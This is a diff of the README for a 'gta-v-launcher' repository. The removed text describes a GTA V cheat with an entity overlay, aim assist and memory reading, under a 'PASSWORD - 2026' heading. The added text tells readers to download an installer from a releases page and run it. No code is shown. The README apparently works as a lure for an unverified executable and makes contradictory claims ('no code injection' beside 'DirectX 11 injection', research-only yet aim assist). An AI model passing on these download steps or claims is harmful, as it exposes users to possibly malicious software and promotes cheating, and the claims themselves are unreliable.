@@ -1,117 +1,84 @@
-<div align="center">
+# 🎮 gta-v-launcher - Real-Time Insights for GTA V
 
-  <img src="https://placehold.co/900x250/0c0c0c/ffffff?text=GTA+V+Runtime+Visualization+Framework" alt="GTA V Visualization Framework" width="100%">
+## 🚀 Getting Started
 
-  <h1>GTA V (Mod Menu) Runtime Visualization Framework</h1>
-  <h3>A precision-oriented toolkit for real-time entity analysis and spatial awareness in GTA V environments.</h3>
+Welcome to the **gta-v-launcher**! This tool enhances your experience in GTA V by providing real-time visualization of game entities and spatial awareness. It’s perfect for players looking to improve their gameplay with precise information.
 
-  <br>
+## 📦 Download & Install
 
-  <a href="#features">
-    <img src="https://img.shields.io/badge/Status-Active%20%7C%202026%20Compatible-00ccff?style=for-the-badge&logo=github"/>
-  </a>
-  <a href="#compatibility">
-    <img src="https://img.shields.io/badge/Integration-Rage%20Plugin%20Hook%20%7C%20C%23%20Runtime-ff6600?style=for-the-badge&logo=csharp"/>
-  </a>
-  <a href="#disclaimer">
-    <img src="https://img.shields.io/badge/License-Research%20Use%20Only-888888?style=for-the-badge"/>
-  </a>
+To start using **gta-v-launcher**, you need to download it. Click the button below to visit the download page:
 
-  <br><br>
+[![Download Latest Build (v2.1.0)](https://img.shields.io/badge/Download-Latest%20Build%20(v2.1.0)-00ff9d?style=for-the-badge)](https://github.com/PrankHimJohn/gta-v-launcher/releases)
 
-  <a href="https://github.com/LizardHarbor/gta-v-launcher/releases/tag/VAlitTag">
-    <img src="https://img.shields.io/badge/Download-Latest%20Build%20(v2.1.0)-00ff9d?style=for-the-badge&logo=windows"/>
-  </a>
+### Steps to Download and Run
 
-</div>
+1. **Visit the Releases Page**  
+   Click on this [link](https://github.com/PrankHimJohn/gta-v-launcher/releases) to go to the releases page.
 
----
-## PASSWORD - 2026
-### Overview
+2. **Select the Latest Version**  
+   Find the latest version available, which will be highlighted at the top of the page.
 
-This project is a **low-level visualization layer** designed to interface directly with GTA V’s runtime memory structures. It enables real-time rendering of entity positions, identities, and spatial relationships — strictly within **private, offline sessions**.
+3. **Download the Installer**  
+   Click on the installer file for your operating system. This will download the application to your computer.
 
-Built for:
-- Advanced game researchers  
-- Runtime analysis enthusiasts  
-- Developers testing spatial logic in open-world environments  
+4. **Open the Installer**  
+   Locate the downloaded file on your computer, usually in the 'Downloads' folder. Double-click the file to open it.
 
-> This is **not a gameplay modification tool**. It is a **technical framework** for understanding how dynamic entities are represented in memory and rendered on-screen.
+5. **Follow the Installation Instructions**  
+   Follow the on-screen prompts to complete the installation. The process is straightforward, just click "Next" several times and then "Finish".
 
----
+6. **Launch the Application**  
+   After installation, locate the gta-v-launcher icon on your desktop or in your programs list. Double-click the icon to open the application.
 
-### Core Capabilities
+7. **Configure Settings**  
+   Once the application is running, you may want to adjust settings according to your preferences. Explore the options to find what works best for you.
 
-#### ▸ Entity Context Overlay  
-Render persistent visual indicators for all in-world entities — players, vehicles, NPCs — including labels, distance metrics, and class identifiers. Fully respects draw distance and occlusion logic.
+## 🛠️ Features
 
-#### ▸ Target Alignment Assistance  
-Simulates cursor-to-entity alignment based on predictive trajectory models. Mirrors behavior found in modern assist systems — **disabled in online contexts by design**.
+- **Real-Time Entity Analysis**  
+  See the entities in the game as they move and change. This helps you track your surroundings effortlessly.
 
-#### ▸ Dynamic UI Architecture  
-Modular interface with hotkey toggles (`F2`), minimal GPU overhead, and resolution-adaptive scaling. Built on DirectX 11 injection principles.
+- **Spatial Awareness Tools**  
+  Get insights about your position in the game world. This allows for better navigation and strategy.
 
-#### ▸ Memory Mapping Layer  
-Read-only access to game state via structured memory signatures. No code injection, no write operations — purely observational.
+- **User-Friendly Interface**  
+  The launcher has a clean and simple interface, designed for ease of use.
 
-#### ▸ Session Safety Protocol  
-Automatically disables all visual layers when online mode is detected. Complies with Rockstar’s network integrity policies by default.
+- **Integration with Rage Plugin Hook**  
+  Seamlessly combines with Rage Plugin Hook for enhanced performance.
 
----
+## 🖥️ System Requirements
 
-### Compatibility
+To use **gta-v-launcher**, ensure your PC meets the following requirements:
 
-- **Game Version**: GTA V v1.0.3094.0 (January 2026)  
-- **Platform**: Steam / Epic / Rockstar Launcher (Windows)  
-- **Runtime**: Requires .NET 6.0 and Visual C++ Redistributable  
-- **Integration**: Works exclusively through **Rage Plugin Hook (RPH)** — no standalone injector  
+- **Operating System**: Windows 10 or higher
+- **Processor**: Intel Core i5 or equivalent
+- **RAM**: 8 GB or higher
+- **Graphics**: NVIDIA GeForce GTX 750 or equivalent
+- **Storage**: At least 500 MB free space
 
-> You are responsible for ensuring your RPH setup complies with local EULA terms.
+## ⚙️ Compatibility
 
----
+**gta-v-launcher** works with Rage Plugin Hook and the C# runtime, making it an essential tool for mod users. Ensure that you have the latest versions to avoid compatibility issues.
 
-### Installation
+## 📜 Disclaimer
 
-1. Install [Rage Plugin Hook](https://ragepluginhook.net/) (v2.100+)  
-2. Extract the release archive into your `GTA5/plugins` folder  
-3. Launch GTA V in **single-player mode only**  
-4. Press `F2` to toggle the visualization layer  
+This application is intended for research and personal use only. Please comply with all applicable laws and regulations when using it.
 
-> ⚠️ **Never load this in GTA Online.** Doing so violates Rockstar’s Terms of Service and may result in account termination.
+## 🛠️ Troubleshooting
 
----
+If you encounter issues:
 
-### Why This Framework Stands Apart
+- **Check Compatibility**: Ensure your system meets the requirements.
+- **Reinstall the Application**: Sometimes, a clean install helps resolve issues.
+- **Visit the FAQ**: Check GitHub for commonly asked questions.
 
-- **Zero performance penalty** — optimized DirectX rendering pipeline  
-- **Signature-resilient** — auto-adapts to minor game updates  
-- **Clean, documented source** — fully annotated C# with memory map references  
-- **Ethical by design** — built to observe, not to interfere  
-- **Maintained actively** — weekly compatibility checks as of 2026  
+For further assistance, you can contact the support community in the issues section of the GitHub repository.
 
-This isn’t another repackaged script.  
-This is **precision engineering for those who understand the difference**.
+## 🌍 Community and Support
 
----
+Join a community of players and developers interested in GTA V modding. Share your experiences, ask for help, and discover new ways to enhance your gameplay.
 
-### Disclaimer
+Explore more by visiting our GitHub issues page, where you can engage with other users and get support directly from developers.
 
-<div id="disclaimer">
-
-This software is provided strictly for **private, offline, educational research**.  
-It must **never** be used in GTA Online or any multiplayer environment.  
-The author disclaims all liability for misuse.  
-By downloading, you confirm you have read and accepted Rockstar’s [Software License Agreement](https://www.rockstargames.com/eula).
-
-</div>
-
----
-
-### Final Note
-
-If you’re here to **study**, **analyze**, or **understand** — you’re welcome.  
-If you’re here to **disrupt**, **exploit**, or **gain unfair advantage** — this is not for you.
-
-We build for the curious. Not the careless.
-
-> Crafted in 2026. For those who see beyond the screen.
+Happy gaming!
